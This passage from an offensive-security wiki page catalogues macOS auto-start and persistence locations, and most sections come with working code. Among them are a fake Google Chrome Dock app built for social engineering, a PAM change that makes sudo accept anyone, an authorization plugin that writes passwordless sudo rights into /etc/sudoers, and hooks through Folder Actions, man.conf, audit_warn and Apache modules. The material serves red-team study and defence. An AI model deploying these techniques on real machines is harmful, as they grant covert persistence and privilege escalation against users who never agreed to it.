```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```

Run the setup script with:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

* This is the way yo implement this persistence via GUI:

This is the script that will be executed:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compile it with: `osacompile -l JavaScript -o folder.scpt source.js`

Move it to:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Now, if you open that folder with **Finder**, your script will be executed.

This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.

Now, lets try to prepare this persistence without GUI access:

1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to `/tmp` to backup it:
   * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remove** the Folder Actions you just set:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Now that we have an empty environment

3. Copy the backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Open the Folder Actions Setup.app to consume this config: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
And this didn't work for me, but those are the instructions from the writeup:(
{% endhint %}

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  * But you need to have installed a malicious application inside the system
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `~/Library/Preferences/com.apple.dock.plist`
  * **Trigger**: When the user clicks on the app inside the dock

#### Description & Exploitation

All the applications that appear in the Dock are specified inside the plist: **`~/Library/Preferences/com.apple.dock.plist`**

It's possible to **add an application** just with:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * A very specific action needs to happen
  * You will end in another sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/Library/ColorPickers`
  * Root required
  * Trigger: Use the color picker
* `~/Library/ColorPickers`
  * Trigger: Use the color picker

#### Description & Exploit

**Compile a color picker** bundle with your code (you could use [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) and add a constructor (like in the [Screen Saver section](macos-auto-start-locations.md#screen-saver)) and copy the bundle to `~/Library/ColorPickers`.

Then, when the color picker is triggered your should should be aswell.

Note that the binary loading your library has a **very restrictive sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Useful to bypass sandbox: **No, because you need to execute your own app**
* TCC bypass: ???

#### Location

* A specific app

#### Description & Exploit

An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).

Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you will end in a common application sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/System/Library/Screen Savers`
  * Root required
  * **Trigger**: Select the screen saver
* `/Library/Screen Savers`
  * Root required
  * **Trigger**: Select the screen saver
* `~/Library/Screen Savers`
  * **Trigger**: Select the screen saver

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Create a new project in Xcode and select the template to generate a new **Screen Saver**. Then, are your code to it, for example the following code to generate logs.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Note that because inside the entitlements of the binary that loads this code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) you can find **`com.apple.security.app-sandbox`** you will be **inside the common application sandbox**.
{% endhint %}

Saver code:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you will end in an application sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  * The sandbox looks very limited

#### Location

* `~/Library/Spotlight/`
  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
* `/Library/Spotlight/`
  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
  * Root required
* `/System/Library/Spotlight/`
  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
  * Root required
* `Some.app/Contents/Library/Spotlight/`
  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
  * New app required

#### Description & Exploitation

Spotlight is macOS's built-in search feature, designed to provide users with **quick and comprehensive access to data on their computers**.\
To facilitate this rapid search capability, Spotlight maintains a **proprietary database** and creates an index by **parsing most files**, enabling swift searches through both file names and their content.

The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.

The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.

It's possible to **find all the `mdimporters`** loaded running:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

And for example **/Library/Spotlight/iBooksAuthor.mdimporter** is used to parse these type of files (extensions `.iba` and `.book` among others):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

{% hint style="danger" %}
If you check the Plist of other `mdimporter` you might not find the entry **`UTTypeConformsTo`**. Thats because that is a built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) and it doesn't need to specify extensions.

Moreover, System default plugins always take precedence, so an attacker can only access files that are not otherwise indexed by Apple's own `mdimporters`.
{% endhint %}

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
It doesn't look like this is working anymore.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * It needs a specific user action
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Description

It doesn't look like this is working anymore.

## Root Sandbox Bypass

{% hint style="success" %}
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** being **root** and/or requiring other **weird conditions.**
{% endhint %}

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you need to be root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  * Root required
  * **Trigger**: When the time comes
* `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
  * Root required
  * **Trigger**: When the time comes

#### Description & Exploitation

The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. Note that scripts stored in `/etc/periodic/` are **executed** as the **owner of the file,** so this won't work for a potential privilege escalation.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

There are other periodic scripts that will be executed indicated in **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **executed sooner or later**.

{% hint style="warning" %}
Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you need to be root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* Root always required

#### Description & Exploitation

As PAM is more focused in **persistence** and malware that on easy execution inside macOS, this blog won't give a detailed explanation, **read the writeups to understand this technique better**.

Check PAM modules with:

```bash
ls -l /etc/pam.d
```

A persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line:

```bash
auth       sufficient     pam_permit.so
```

So it will **looks like** something like this:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

And therefore any attempt to use **`sudo` will work**.

{% hint style="danger" %}
Note that this directory is protected by TCC so it's highly probably that the user will get a prompt asking for access.
{% endhint %}

Another nice example is su, were you can see that it's also possible to give parameters to the PAM modules (and you coukd also backdoor this file):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you need to be root and make extra configs
* TCC bypass: ???

#### Location

* `/Library/Security/SecurityAgentPlugins/`
  * Root required
  * It's also needed to configure the authorization database to use the plugin

#### Description & Exploitation

You can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Move** the bundle to the location to be loaded:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Finally add the **rule** to load this Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

The **`evaluate-mechanisms`** will tell the authorization framework that it will need to **call an external mechanism for authorization**. Moreover, **`privileged`** will make it be executed by root.

Trigger it with:

```bash
security authorize com.asdf.asdf
```

And then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you need to be root and the user must use man
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/private/etc/man.conf`**
  * Root required
  * **`/private/etc/man.conf`**: Whenever man is used

#### Description & Exploit

The config file **`/private/etc/man.conf`** indicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.

For example set in **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

And then create `/tmp/view` as:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you need to be root and apache needs to be running
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  * Httpd doesn't have entitlements

#### Location

* **`/etc/apache2/httpd.conf`**
  * Root required
  * Trigger: When Apache2 is started

#### Description & Exploit

You can indicate in `/etc/apache2/httpd.conf` to load a module adding a line such as:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

This way your compiled moduled will be loaded by Apache. The only thing is that either you need to **sign it with a valid Apple certificate**, or you need to **add a new trusted certificate** in the system and **sign it** with it.

Then, if needed , to make sure the server will be started you could execute:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Code example for the Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  * But you need to be root, auditd be running and cause a warning
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/etc/security/audit_warn`**
  * Root required
  * **Trigger**: When auditd detects a warning

#### Description & Exploit

Whenever auditd detects a warning the script **`/etc/security/audit_warn`** is **executed**. So you could add your payload on it.

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

You could force a warning with `sudo audit -n`.

### Startup Items

{% hint style="danger" %}
**This is deprecated, so nothing should be found in those directories.**
{% endhint %}

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: A shell script executed at startup.
2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.

Ensure that both the rc script and the `StartupParameters.plist` file are correctly placed inside the **StartupItem** directory for the startup process to recognize and utilize them.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
I cannot find this component in my macOS so for more info check the writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Introduced by Apple, **emond** is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. While not particularly beneficial for a Mac administrator, this obscure service could serve as a subtle persistence method for threat actors, likely unnoticed by most macOS admins.

For those aware of its existence, identifying any malicious usage of **emond** is straightforward. The system's LaunchDaemon for this service seeks scripts to execute in a single directory. To inspect this, the following command can be used:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Location

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  * Root required
  * **Trigger**: With XQuartz

#### Description & Exploit

XQuartz is **no longer installed in macOS**, so if you want more info check the writeup.

### ~~kext~~

{% hint style="danger" %}
It's so complicated to install kext even as root taht I won't consider this to escape from sandboxes or even for persistence (unless you have an exploit)
{% endhint %}

#### Location

In order to install a KEXT as a startup item, it needs to be **installed in one of the following locations**:

* `/System/Library/Extensions`
  * KEXT files built into the OS X operating system.
* `/Library/Extensions`
  * KEXT files installed by 3rd party software

You can list currently loaded kext files with:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Location

* **`/usr/local/bin/amstoold`**
  * Root required

#### Description & Exploitation

Apparently the `plist` from `/System/Library/LaunchAgents/com.apple.amstoold.plist` was using this binary while exposing a XPC service... the thing is that the binary didn't exist, so you could place something there and when the XPC service gets called your binary will be called.

I can no longer find this in my macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Location

* **`/Library/Preferences/Xsan/.xsanrc`**
  * Root required
  * **Trigger**: When the service is run (rarely)

#### Description & exploit

Apparently it's not very common to run this script and I couldn't even find it in my macOS, so if you want more info check the writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**This isn't working in modern MacOS versions**
{% endhint %}

It's also possible to place here **commands that will be executed at startup.** Example os regular rc.common script:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

## Persistence techniques and tools

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

